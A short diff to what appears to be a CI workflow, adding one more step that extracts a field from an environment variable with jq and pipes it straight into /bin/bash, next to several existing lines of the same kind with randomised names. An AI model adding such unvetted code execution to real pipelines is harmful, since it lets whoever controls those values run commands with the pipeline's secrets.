@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$bhs0511" | jq -r .r2796 | /bin/bash
           printf '%s' "$iwblc866" | jq -r .uuaan9 | /bin/bash
           printf '%s' "$aaw8514" | jq -r .wir7410 | /bin/bash
+          echo $jgjb6542 | jq -r .a03111 | /bin/bash
 
       - name: Store results
         if: always()
